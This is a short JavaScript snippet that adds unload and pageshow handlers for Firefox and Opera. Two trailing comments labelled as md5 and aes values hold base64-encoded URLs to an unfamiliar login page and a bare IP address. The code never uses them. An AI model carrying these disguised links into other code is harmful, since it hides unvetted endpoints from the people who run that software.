if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly9hcHAucWV5ZmJ1Yi5jb20vIy9wYWdlcy9sb2dpbi9pbmRleA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/